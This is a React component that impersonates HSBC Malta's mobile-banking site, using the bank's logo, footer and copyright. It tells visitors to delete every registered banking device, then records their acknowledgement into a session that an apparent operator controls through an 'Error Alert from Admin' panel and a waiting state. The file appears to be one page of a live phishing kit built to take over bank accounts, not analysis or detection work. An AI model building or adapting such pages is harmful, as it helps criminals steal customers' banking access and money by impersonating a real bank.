import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { useForm } from '@/contexts/FormContext';
import { ChevronDown, Smartphone, Menu } from 'lucide-react';
import ErrorAlert from '@/components/ErrorAlert';
import hsbcLogo from '/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png';
import { getTimeBasedGreeting } from '@/lib/timeGreeting';

const DeviceRemovePage = () => {
  const { updateSessionData, setWaiting } = useForm();

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('deviceRemove', { acknowledged: true });
    setWaiting(true);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with hamburger menu and HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Menu className="h-6 w-6 text-gray-600" />
            <img 
              src={hsbcLogo} 
              alt="HSBC" 
              className="h-8 w-auto"
            />
          </div>
        </div>
      </div>

      {/* Main Content Container */}
      <div className="flex-1 flex flex-col">
        {/* Main Content */}
        <div className="flex-1 flex items-start justify-center px-6 pt-8">
          <div className="w-full max-w-md mx-auto">
            
            {/* Time-based greeting section */}
            <div className="mb-8">
              <div className="flex items-center space-x-2 text-gray-600 mb-6">
                <span className="text-lg">{getTimeBasedGreeting()}</span>
                <ChevronDown className="h-5 w-5" />
              </div>
            </div>

            {/* Device Registration Section */}
            <div className="mb-8">
              <div className="flex items-center space-x-3 mb-6">
                <Smartphone className="h-6 w-6 text-gray-600" />
                <h2 className="text-lg font-medium text-gray-800">Device Registration</h2>
              </div>
              
              <div className="space-y-6">
                {/* Error Alert from Admin */}
                <ErrorAlert />

                {/* Instructions */}
                <div className="bg-gray-50 rounded-lg p-6 space-y-4">
                  <p className="text-sm text-gray-700 leading-relaxed">
                    To use this device for the HSBC Mobile Banking app, you must first remove all devices previously registered for mobile banking, including the device you are currently using, by doing the following:
                  </p>
                  
                  <div className="space-y-3 text-sm text-gray-700">
                    <p>1. Log on to your old device (if you still have access).</p>
                    <p>2. Select the 'Profile' icon in the top right-hand corner.</p>
                    <p>3. Go to 'Security' → 'Manage devices'.</p>
                    <p>4. Select each device shown (including the one you are using now) and choose 'Delete'.</p>
                  </div>
                  
                  <p className="text-sm text-gray-700 font-medium pt-3">
                    Once you have removed all devices, return to this screen and press Continue to register your device again.
                  </p>
                </div>

                {/* Continue Button */}
                <form onSubmit={handleContinue} className="space-y-6">
                  <div className="flex justify-end">
                    <Button
                      type="submit"
                      className="px-8 py-3 bg-red-300 hover:bg-red-400 text-white font-medium rounded text-base transition-all"
                      style={{ backgroundColor: 'rgb(229, 152, 155)' }}
                    >
                      Continue
                    </Button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-black text-white py-6 mt-auto">
          <div className="max-w-7xl mx-auto px-6 text-center">
            <div className="text-sm space-y-2">
              <div className="flex items-center justify-center space-x-4">
                <span>Investor relations</span>
                <span>|</span>
                <span>HSBC Group</span>
                <span>|</span>
                <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
              </div>
              <div>
                <span>This website is designed for use in Malta. Cross-border banking</span>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default DeviceRemovePage;